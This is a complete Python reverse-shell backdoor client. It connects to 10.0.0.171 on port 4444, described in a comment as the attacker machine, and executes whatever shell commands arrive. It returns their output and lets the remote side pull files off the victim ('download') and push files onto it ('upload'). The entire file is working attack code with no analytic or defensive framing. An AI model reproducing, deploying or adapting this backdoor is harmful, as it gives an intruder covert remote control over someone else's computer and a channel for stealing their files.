import socket
import json
import subprocess
import os


def send_output(command):
	command_dump = json.dumps(command)
	soc.send(command_dump.encode())

def get_command():
	output = soc.recv(1024).decode()
	return json.loads(output)



#upload file to attacker machine
def send_file(file_name):
	with open(file_name, 'rb')as file:
		soc.send(file.read())
	print("[+] {} uploaded".format(file_name))

def get_file(file_name):
	soc.settimeout(1)
	with open(file_name, 'wb')as file:
		while True:
			try:
				fragment = soc.recv(1024)
				file.write(fragment)
			except:
				break
	soc.settimeout(None)
	print("[+] {} downloaded".format(file_name))

				 

def runcommands():
	while True:
		command = get_command()
		if command == 'quit':
			break
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			send_file(command[9:])
		elif command[:6] == 'upload':
			get_file(command[7:])
		else:
			run_proccess = subprocess.Popen(command,shell=True,stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
			command_output = run_proccess.stdout.read() + run_proccess.stderr.read()
			send_output(command_output.decode())



def establishconnection():
	while True:
		soc.connect(("10.0.0.171",4444))
		runcommands()
		soc.close()



soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
establishconnection()

